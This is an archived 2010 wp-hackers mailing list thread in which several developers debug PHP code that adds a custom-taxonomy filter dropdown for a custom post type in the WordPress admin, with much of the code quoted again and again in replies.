> > >>> 'classement_fr',
> > >>> array( 'ressource_fr' ),
> > >>> array(
> > >>> 'public' => true,
> > >>> 'hierarchical' => true,
> > >>> 'labels' => array(
> > >>> 'name' => __( 'Classements FR' ),
> > >>> 'singular_name' => __( 'Classement FR' )
> > >>> ),
> > >>> 'query_var' => 'classement-fr',
> > >>>       'rewrite' => array( 'slug' => 'cours-fr' ),
> > >>> )
> > >>> );
> > >>> }
> > >>>
> > >>>
> > >>> // pour filtrer les ressources par classement
> > >>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
> > >>>
> > >>> function my_restrict_manage_posts() {
> > >>> global $typenow;
> > >>> if ($typenow=='ressource_fr')
> > >>> wp_dropdown_categories( 'show_option_all=Afficher
> > >>>
> > >>
> >
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
> > >>> }
> > >>>
> > >>> add_action( 'request', 'my_request' );
> > >>> function my_request($request) {
> > >>>      if (isset($request['post_type']) &&
> > >>> $request['post_type']=='ressource_fr') {
> > >>>              $request['taxonomy'] = 'classement_fr';
> > >>>              $request['term'] =
> > >>> get_term($request['classement-fr'],'classement_fr')->name;
> > >>>              unset($request['name']);
> > >>>      }
> > >>>      return $request;
> > >>> }
> > >>>
> > >>> generated html :
> > >>> <select id="classement_fr" name="classement_fr"> <option
> value="0">Show
> > >> All
> > >>> Classements FR</option> <option value="5">Langue oral</option>
> <option
> > >> value
> > >>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option
> > >> value="8
> > >>> ">Niveau 3</option> </select><input type="submit"
> > id="post-query-submit"
> > >>> value="Filtrer" class="button-secondary" />
> > >>> _______________________________________________
> > >>> wp-hackers mailing list
> > >>> wp-hackers at lists.automattic.com
> > >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >>
> > >> _______________________________________________
> > >> wp-hackers mailing list
> > >> wp-hackers at lists.automattic.com
> > >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >>
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
> ------------------------------
>
> Message: 3
> Date: Fri, 23 Jul 2010 13:02:34 +0200
> From: Frank Bueltge <frank at bueltge.de>
> Subject: Re: [wp-hackers] Custom Post Type in Admin,    filter by new
>        custom  Taxonomies
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTinXfH2EO-Bv5KCZgH_6DuE-QKf9xwVSLCLOgTE5 at mail.gmail.com>
> Content-Type: text/plain; charset=UTF-8
>
> @mike: i hope is not to much source, is an example plugin to test
> possibilies with custom post type
> http://wordpress.pastebin.com/0u7DW03C
>
>
>
> On Fri, Jul 23, 2010 at 12:31 PM, Mike Schinkel
> <mikeschinkel at newclarity.net> wrote:
> > Frank,
> >
> > Please show me your ?register_post_type, request hook,
> restrict_manage_posts. Post the code at http://wordpress.pastebin.com/ or
> http://gist.github.com/ so it's indented and easier to read.
> >
> > -Mike
> >
> > On Jul 23, 2010, at 6:29 AM, Frank Bueltge wrote:
> >
> >> with fitler:
> >> Array ( [cat] => 26 [order] => DESC [orderby] => date [post_type] =>
> >> quotes [posts_per_page] => 20 )
> >>
> >> default, without filter.
> >> Array ( [order] => DESC [orderby] => date [post_type] => quotes
> >> [posts_per_page] => 20 )
> >>
> >>
> >>
> >> On Fri, Jul 23, 2010 at 12:23 PM, Mike Schinkel
> >> <mikeschinkel at newclarity.net> wrote:
> >>> What do you get in the view source when you using this instead:
> >>>
> >>> function request($request) {
> >>> ? ? ? ?print_r($request);
> >>> ? ? ? ?exit;
> >>> }
> >>>
> >>> Also, what's your URL after clicking the "Filter" button?
> >>>
> >>> -Mike
> >>>
> >>>
> >>> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
> >>>
> >>>> now, when I click on filter button the result is always the same, all
> list
> >>>> of ressources.
> >>>>
> >>>> my code :
> >>>>
> >>>> add_action( 'init', 'register_profperso_taxonomies', 0 );
> >>>>
> >>>> function register_profperso_taxonomies() {
> >>>>
> >>>> register_taxonomy(
> >>>> 'classement_fr',
> >>>> array( 'ressource_fr' ),
> >>>> array(
> >>>> 'public' => true,
> >>>> 'hierarchical' => true,
> >>>> 'labels' => array(
> >>>> 'name' => __( 'Classements FR' ),
> >>>> 'singular_name' => __( 'Classement FR' )
> >>>> ),
> >>>> 'query_var' => 'classement-fr',
> >>>> ? ? ? ?'rewrite' => array( 'slug' => 'cours-fr' ),
> >>>> )
> >>>> );
> >>>> }
> >>>>
> >>>>
> >>>> // pour filtrer les ressources par classement
> >>>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
> >>>>
> >>>> function my_restrict_manage_posts() {
> >>>> global $typenow;
> >>>> if ($typenow=='ressource_fr')
> >>>> wp_dropdown_categories( 'show_option_all=Afficher
> >>>>
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
> >>>> }
> >>>>
> >>>> add_action( 'request', 'my_request' );
> >>>> function my_request($request) {
> >>>> ? ? ? if (isset($request['post_type']) &&
> >>>> $request['post_type']=='ressource_fr') {
> >>>> ? ? ? ? ? ? ? $request['taxonomy'] = 'classement_fr';
> >>>> ? ? ? ? ? ? ? $request['term'] =
> >>>> get_term($request['classement-fr'],'classement_fr')->name;
> >>>> ? ? ? ? ? ? ? unset($request['name']);
> >>>> ? ? ? }
> >>>> ? ? ? return $request;
> >>>> }
> >>>>
> >>>> generated html :
> >>>> <select id="classement_fr" name="classement_fr"> <option
> value="0">Show All
> >>>> Classements FR</option> <option value="5">Langue oral</option> <option
> value
> >>>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option
> value="8
> >>>> ">Niveau 3</option> </select><input type="submit"
> id="post-query-submit"
> >>>> value="Filtrer" class="button-secondary" />
> >>>> _______________________________________________
> >>>> wp-hackers mailing list
> >>>> wp-hackers at lists.automattic.com
> >>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>
> >>> _______________________________________________
> >>> wp-hackers mailing list
> >>> wp-hackers at lists.automattic.com
> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
> ------------------------------
>
> Message: 4
> Date: Fri, 23 Jul 2010 07:04:54 -0400
> From: Mike Schinkel <mikeschinkel at newclarity.net>
> Subject: Re: [wp-hackers] Custom Post Type in Admin,    filter by new
>        custom  Taxonomies
> To: wp-hackers at lists.automattic.com
> Message-ID: <BD16269A-6163-4F9F-BFC8-CDA525E5908F at newclarity.net>
> Content-Type: text/plain; charset=us-ascii
>
> Jimmy,
>
> I just noticed, '[classement_fr] => 6' is not in your array.
>
> First try to use either "classement_fr" everywhere or "classement-fr" and
> see if that fixes it.
>
> -Mike
>
> On Jul 23, 2010, at 6:32 AM, Jimmy Roy wrote:
>
> > Array ( [order] => asc [orderby] => menu_order title [post_type] =>
> > ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1 )
> >
> > url after clicking "filter" button :
> >
> >
> http://localhost:8888/wp3.0/profperso/wp-admin/edit.php?s&post_status=all&post_type=ressource_fr&mode=list&action=-1&m=0&classement_fr=6&action2=-1
> >
> >
> > 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> >
> >> What do you get in the view source when you using this instead:
> >>
> >> function request($request) {
> >>       print_r($request);
> >>       exit;
> >> }
> >>
> >> Also, what's your URL after clicking the "Filter" button?
> >>
> >> -Mike
> >>
> >>
> >> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
> >>
> >>> now, when I click on filter button the result is always the same, all
> >> list
> >>> of ressources.
> >>>
> >>> my code :
> >>>
> >>> add_action( 'init', 'register_profperso_taxonomies', 0 );
> >>>
> >>> function register_profperso_taxonomies() {
> >>>
> >>> register_taxonomy(
> >>> 'classement_fr',
> >>> array( 'ressource_fr' ),
> >>> array(
> >>> 'public' => true,
> >>> 'hierarchical' => true,
> >>> 'labels' => array(
> >>> 'name' => __( 'Classements FR' ),
> >>> 'singular_name' => __( 'Classement FR' )
> >>> ),
> >>> 'query_var' => 'classement-fr',
> >>>       'rewrite' => array( 'slug' => 'cours-fr' ),
> >>> )
> >>> );
> >>> }
> >>>
> >>>
> >>> // pour filtrer les ressources par classement
> >>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
> >>>
> >>> function my_restrict_manage_posts() {
> >>> global $typenow;
> >>> if ($typenow=='ressource_fr')
> >>> wp_dropdown_categories( 'show_option_all=Afficher
> >>>
> >>
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
> >>> }
> >>>
> >>> add_action( 'request', 'my_request' );
> >>> function my_request($request) {
> >>>      if (isset($request['post_type']) &&
> >>> $request['post_type']=='ressource_fr') {
> >>>              $request['taxonomy'] = 'classement_fr';
> >>>              $request['term'] =
> >>> get_term($request['classement-fr'],'classement_fr')->name;
> >>>              unset($request['name']);
> >>>      }
> >>>      return $request;
> >>> }
> >>>
> >>> generated html :
> >>> <select id="classement_fr" name="classement_fr"> <option value="0">Show
> >> All
> >>> Classements FR</option> <option value="5">Langue oral</option> <option
> >> value
> >>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option
> >> value="8
> >>> ">Niveau 3</option> </select><input type="submit"
> id="post-query-submit"
> >>> value="Filtrer" class="button-secondary" />
> >>> _______________________________________________
> >>> wp-hackers mailing list
> >>> wp-hackers at lists.automattic.com
> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>
> ------------------------------
>
> Message: 5
> Date: Fri, 23 Jul 2010 07:12:56 -0400
> From: Mike Schinkel <mikeschinkel at newclarity.net>
> Subject: Re: [wp-hackers] Custom Post Type in Admin,    filter by new
>        custom  Taxonomies
> To: wp-hackers at lists.automattic.com
> Message-ID: <B0E5841F-AB25-47BE-94D4-C815460BA672 at newclarity.net>
> Content-Type: text/plain;       charset=us-ascii
>
> One problem, for sure, is line 131, should be:
>
>  wp_dropdown_categories( 'show_option_all=' . __( 'View all authors',
> FB_CPT_TEXTDOMAIN ) . '&show_count=1&hierarchical=1&taxonomy='
> .FB_CPT_TAXONOMY_TYPE_1 . '&name=' .FB_CPT_TAXONOMY_TYPE_1);
>
> If that doesn't solve it you may be on your own (or get someone else here
> to help) as I have to get some sleep eventually...
>
> On Jul 23, 2010, at 7:02 AM, Frank Bueltge wrote:
>
> > @mike: i hope is not to much source, is an example plugin to test
> > possibilies with custom post type
> > http://wordpress.pastebin.com/0u7DW03C
> >
> >
> >
> > On Fri, Jul 23, 2010 at 12:31 PM, Mike Schinkel
> > <mikeschinkel at newclarity.net> wrote:
> >> Frank,
> >>
> >> Please show me your  register_post_type, request hook,
> restrict_manage_posts. Post the code at http://wordpress.pastebin.com/ or
> http://gist.github.com/ so it's indented and easier to read.
> >>
> >> -Mike
> >>
> >> On Jul 23, 2010, at 6:29 AM, Frank Bueltge wrote:
> >>
> >>> with fitler:
> >>> Array ( [cat] => 26 [order] => DESC [orderby] => date [post_type] =>
> >>> quotes [posts_per_page] => 20 )
> >>>
> >>> default, without filter.
> >>> Array ( [order] => DESC [orderby] => date [post_type] => quotes
> >>> [posts_per_page] => 20 )
> >>>
> >>>
> >>>
> >>> On Fri, Jul 23, 2010 at 12:23 PM, Mike Schinkel
> >>> <mikeschinkel at newclarity.net> wrote:
> >>>> What do you get in the view source when you using this instead:
> >>>>
> >>>> function request($request) {
> >>>>        print_r($request);
> >>>>        exit;
> >>>> }
> >>>>
> >>>> Also, what's your URL after clicking the "Filter" button?
> >>>>
> >>>> -Mike
> >>>>
> >>>>
> >>>> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
> >>>>
> >>>>> now, when I click on filter button the result is always the same, all
> list
> >>>>> of ressources.
> >>>>>
> >>>>> my code :
> >>>>>
> >>>>> add_action( 'init', 'register_profperso_taxonomies', 0 );
> >>>>>
> >>>>> function register_profperso_taxonomies() {
> >>>>>
> >>>>> register_taxonomy(
> >>>>> 'classement_fr',
> >>>>> array( 'ressource_fr' ),
> >>>>> array(
> >>>>> 'public' => true,
> >>>>> 'hierarchical' => true,
> >>>>> 'labels' => array(
> >>>>> 'name' => __( 'Classements FR' ),
> >>>>> 'singular_name' => __( 'Classement FR' )
> >>>>> ),
> >>>>> 'query_var' => 'classement-fr',
> >>>>>        'rewrite' => array( 'slug' => 'cours-fr' ),
> >>>>> )
> >>>>> );
> >>>>> }
> >>>>>
> >>>>>
> >>>>> // pour filtrer les ressources par classement
> >>>>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
> >>>>>
> >>>>> function my_restrict_manage_posts() {
> >>>>> global $typenow;
> >>>>> if ($typenow=='ressource_fr')
> >>>>> wp_dropdown_categories( 'show_option_all=Afficher
> >>>>>
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
> >>>>> }
> >>>>>
> >>>>> add_action( 'request', 'my_request' );
> >>>>> function my_request($request) {
> >>>>>       if (isset($request['post_type']) &&
> >>>>> $request['post_type']=='ressource_fr') {
> >>>>>               $request['taxonomy'] = 'classement_fr';
> >>>>>               $request['term'] =
> >>>>> get_term($request['classement-fr'],'classement_fr')->name;
> >>>>>               unset($request['name']);
> >>>>>       }
> >>>>>       return $request;
> >>>>> }
> >>>>>
> >>>>> generated html :
> >>>>> <select id="classement_fr" name="classement_fr"> <option
> value="0">Show All
> >>>>> Classements FR</option> <option value="5">Langue oral</option>
> <option value
> >>>>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option
> value="8
> >>>>> ">Niveau 3</option> </select><input type="submit"
> id="post-query-submit"
> >>>>> value="Filtrer" class="button-secondary" />
> >>>>> _______________________________________________
> >>>>> wp-hackers mailing list
> >>>>> wp-hackers at lists.automattic.com
> >>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>>
> >>>> _______________________________________________
> >>>> wp-hackers mailing list
> >>>> wp-hackers at lists.automattic.com
> >>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>>
> >>> _______________________________________________
> >>> wp-hackers mailing list
> >>> wp-hackers at lists.automattic.com
> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>
> ------------------------------
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
> End of wp-hackers Digest, Vol 66, Issue 87
> ******************************************
>



-- 
Thank you,

Jared Williams
Web/Graphic Designer
Tweeaks.com  |  New2WP.com

From frank at bueltge.de  Fri Jul 23 11:53:14 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Fri, 23 Jul 2010 13:53:14 +0200
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTikbiOWsQAQ=7YAHUGBky3vGvZs=D+FbivKDZzMb@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com> 
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com> 
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com> 
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com> 
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com> 
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com> 
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com> 
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com> 
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com> 
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com> 
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
	<AANLkTikPOhcktD-Gk9VN4h8zvExGRT3F=TZHv+Q-2YmQ@mail.gmail.com> 
	<AANLkTi=m6ZK48sBBgGYGEtSBbGia3rHeaiJZVQzc9Ja4@mail.gmail.com> 
	<E5CCD001-9745-4D78-B44D-22DB79487DB7@newclarity.net>
	<AANLkTikbiOWsQAQ=7YAHUGBky3vGvZs=D+FbivKDZzMb@mail.gmail.com>
Message-ID: <AANLkTikVWabQCRBiAacPOo61RofvKH3gYoVJEJynapBH@mail.gmail.com>

@jimmy: please check the GLOBALS-vars
if (is_admin() && $GLOBALS['PHP_SELF'] == '/wp-admin/edit.php' &&
isset($request['post_type']) && $request['post_type']=='ressource_fr')
{

i think, $GLOBALS['PHP_SELF'] is not '/wp-admin/edit.php'

maybe you change this to:
		function request($request) {
			global $pagenow;
			
			if ( is_admin() && 'edit.php' == $pagenow && isset(
$request['post_type'] ) && 'ressource_fr' == $request['post_type'] ) {

works now fine on my test

On Fri, Jul 23, 2010 at 1:36 PM, Jimmy Roy <jimmy.roy at gmail.com> wrote:
> actually at first it was name-classement-fr, then I change to try.
>
> the difference is :
> name=classement_fr : chose a custom taxonomy andclick on filter return all
> results in any case.
> name=classement-fr : chose a custom taxonomy andclick on filter return no
> result in any case.
>
> Jimmy
>
> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>
>> In http://pastebin.com/PL1FWtcs line 56 uses "name=classement_fr" whereas
>> line 64 uses "$request['classement-fr']" and they don't match. ?Change line
>> 56 to be "name=classement-fr".
>>
>> -Mike
>>
>> On Jul 23, 2010, at 7:19 AM, Jimmy Roy wrote:
>>
>> > Mike,
>> > classement_fr is the name of the taxonomy.
>> > classement-fr is the value of the query_var argument.
>> >
>> > Jimmy
>> >
>> >
>> >
>> > 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>> >
>> >> Jimmy,
>> >>
>> >> I just noticed, '[classement_fr] => 6' is not in your array.
>> >>
>> >> First try to use either "classement_fr" everywhere or "classement-fr"
>> and
>> >> see if that fixes it.
>> >>
>> >> -Mike
>> >>
>> >> On Jul 23, 2010, at 6:32 AM, Jimmy Roy wrote:
>> >>
>> >>> Array ( [order] => asc [orderby] => menu_order title [post_type] =>
>> >>> ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1 )
>> >>>
>> >>> url after clicking "filter" button :
>> >>>
>> >>>
>> >>
>> http://localhost:8888/wp3.0/profperso/wp-admin/edit.php?s&post_status=all&post_type=ressource_fr&mode=list&action=-1&m=0&classement_fr=6&action2=-1
>> >>>
>> >>>
>> >>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>> >>>
>> >>>> What do you get in the view source when you using this instead:
>> >>>>
>> >>>> function request($request) {
>> >>>> ? ? ?print_r($request);
>> >>>> ? ? ?exit;
>> >>>> }
>> >>>>
>> >>>> Also, what's your URL after clicking the "Filter" button?
>> >>>>
>> >>>> -Mike
>> >>>>
>> >>>>
>> >>>> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
>> >>>>
>> >>>>> now, when I click on filter button the result is always the same, all
>> >>>> list
>> >>>>> of ressources.
>> >>>>>
>> >>>>> my code :
>> >>>>>
>> >>>>> add_action( 'init', 'register_profperso_taxonomies', 0 );
>> >>>>>
>> >>>>> function register_profperso_taxonomies() {
>> >>>>>
>> >>>>> register_taxonomy(
>> >>>>> 'classement_fr',
>> >>>>> array( 'ressource_fr' ),
>> >>>>> array(
>> >>>>> 'public' => true,
>> >>>>> 'hierarchical' => true,
>> >>>>> 'labels' => array(
>> >>>>> 'name' => __( 'Classements FR' ),
>> >>>>> 'singular_name' => __( 'Classement FR' )
>> >>>>> ),
>> >>>>> 'query_var' => 'classement-fr',
>> >>>>> ? ? ?'rewrite' => array( 'slug' => 'cours-fr' ),
>> >>>>> )
>> >>>>> );
>> >>>>> }
>> >>>>>
>> >>>>>
>> >>>>> // pour filtrer les ressources par classement
>> >>>>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
>> >>>>>
>> >>>>> function my_restrict_manage_posts() {
>> >>>>> global $typenow;
>> >>>>> if ($typenow=='ressource_fr')
>> >>>>> wp_dropdown_categories( 'show_option_all=Afficher
>> >>>>>
>> >>>>
>> >>
>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
>> >>>>> }
>> >>>>>
>> >>>>> add_action( 'request', 'my_request' );
>> >>>>> function my_request($request) {
>> >>>>> ? ? if (isset($request['post_type']) &&
>> >>>>> $request['post_type']=='ressource_fr') {
>> >>>>> ? ? ? ? ? ? $request['taxonomy'] = 'classement_fr';
>> >>>>> ? ? ? ? ? ? $request['term'] =
>> >>>>> get_term($request['classement-fr'],'classement_fr')->name;
>> >>>>> ? ? ? ? ? ? unset($request['name']);
>> >>>>> ? ? }
>> >>>>> ? ? return $request;
>> >>>>> }
>> >>>>>
>> >>>>> generated html :
>> >>>>> <select id="classement_fr" name="classement_fr"> <option
>> value="0">Show
>> >>>> All
>> >>>>> Classements FR</option> <option value="5">Langue oral</option>
>> <option
>> >>>> value
>> >>>>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option
>> >>>> value="8
>> >>>>> ">Niveau 3</option> </select><input type="submit"
>> >> id="post-query-submit"
>> >>>>> value="Filtrer" class="button-secondary" />
>> >>>>> _______________________________________________
>> >>>>> wp-hackers mailing list
>> >>>>> wp-hackers at lists.automattic.com
>> >>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>>>
>> >>>> _______________________________________________
>> >>>> wp-hackers mailing list
>> >>>> wp-hackers at lists.automattic.com
>> >>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>>>
>> >>> _______________________________________________
>> >>> wp-hackers mailing list
>> >>> wp-hackers at lists.automattic.com
>> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>
>> >> _______________________________________________
>> >> wp-hackers mailing list
>> >> wp-hackers at lists.automattic.com
>> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Fri Jul 23 11:54:30 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 23 Jul 2010 07:54:30 -0400
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTikbiOWsQAQ=7YAHUGBky3vGvZs=D+FbivKDZzMb@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com>
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
	<AANLkTikPOhcktD-Gk9VN4h8zvExGRT3F=TZHv+Q-2YmQ@mail.gmail.com>
	<AANLkTi=m6ZK48 sBBgGYGEtSBbGia3rHeaiJZVQzc9Ja4@mail.gmail.com>
	<E5CCD001-9745-4D78-B44D-22DB79487DB7@newclarity.net>
	<AANLkTikbiOWsQAQ=7YAHUGBky3vGvZs=D+FbivKDZzMb@mail.gmail.com>
Message-ID: <BCDD0CCE-A01B-459E-BE4D-FBF8CBF9ED5A@newclarity.net>

Jimmy,

I don't know.  You've got something about your implementation that I can't figure out.  Maybe someone else can.  Sorry.

-Mike

On Jul 23, 2010, at 7:36 AM, Jimmy Roy wrote:

> actually at first it was name-classement-fr, then I change to try.
> 
> the difference is :
> name=classement_fr : chose a custom taxonomy andclick on filter return all
> results in any case.
> name=classement-fr : chose a custom taxonomy andclick on filter return no
> result in any case.
> 
> Jimmy
> 
> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> 
>> In http://pastebin.com/PL1FWtcs line 56 uses "name=classement_fr" whereas
>> line 64 uses "$request['classement-fr']" and they don't match.  Change line
>> 56 to be "name=classement-fr".
>> 
>> -Mike
>> 
>> On Jul 23, 2010, at 7:19 AM, Jimmy Roy wrote:
>> 
>>> Mike,
>>> classement_fr is the name of the taxonomy.
>>> classement-fr is the value of the query_var argument.
>>> 
>>> Jimmy
>>> 
>>> 
>>> 
>>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>>> 
>>>> Jimmy,
>>>> 
>>>> I just noticed, '[classement_fr] => 6' is not in your array.
>>>> 
>>>> First try to use either "classement_fr" everywhere or "classement-fr"
>> and
>>>> see if that fixes it.
>>>> 
>>>> -Mike
>>>> 
>>>> On Jul 23, 2010, at 6:32 AM, Jimmy Roy wrote:
>>>> 
>>>>> Array ( [order] => asc [orderby] => menu_order title [post_type] =>
>>>>> ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1 )
>>>>> 
>>>>> url after clicking "filter" button :
>>>>> 
>>>>> 
>>>> 
>> http://localhost:8888/wp3.0/profperso/wp-admin/edit.php?s&post_status=all&post_type=ressource_fr&mode=list&action=-1&m=0&classement_fr=6&action2=-1
>>>>> 
>>>>> 
>>>>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>>>>> 
>>>>>> What do you get in the view source when you using this instead:
>>>>>> 
>>>>>> function request($request) {
>>>>>>     print_r($request);
>>>>>>     exit;
>>>>>> }
>>>>>> 
>>>>>> Also, what's your URL after clicking the "Filter" button?
>>>>>> 
>>>>>> -Mike
>>>>>> 
>>>>>> 
>>>>>> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
>>>>>> 
>>>>>>> now, when I click on filter button the result is always the same, all
>>>>>> list
>>>>>>> of ressources.
>>>>>>> 
>>>>>>> my code :
>>>>>>> 
>>>>>>> add_action( 'init', 'register_profperso_taxonomies', 0 );
>>>>>>> 
>>>>>>> function register_profperso_taxonomies() {
>>>>>>> 
>>>>>>> register_taxonomy(
>>>>>>> 'classement_fr',
>>>>>>> array( 'ressource_fr' ),
>>>>>>> array(
>>>>>>> 'public' => true,
>>>>>>> 'hierarchical' => true,
>>>>>>> 'labels' => array(
>>>>>>> 'name' => __( 'Classements FR' ),
>>>>>>> 'singular_name' => __( 'Classement FR' )
>>>>>>> ),
>>>>>>> 'query_var' => 'classement-fr',
>>>>>>>     'rewrite' => array( 'slug' => 'cours-fr' ),
>>>>>>> )
>>>>>>> );
>>>>>>> }
>>>>>>> 
>>>>>>> 
>>>>>>> // pour filtrer les ressources par classement
>>>>>>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
>>>>>>> 
>>>>>>> function my_restrict_manage_posts() {
>>>>>>> global $typenow;
>>>>>>> if ($typenow=='ressource_fr')
>>>>>>> wp_dropdown_categories( 'show_option_all=Afficher
>>>>>>> 
>>>>>> 
>>>> 
>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
>>>>>>> }
>>>>>>> 
>>>>>>> add_action( 'request', 'my_request' );
>>>>>>> function my_request($request) {
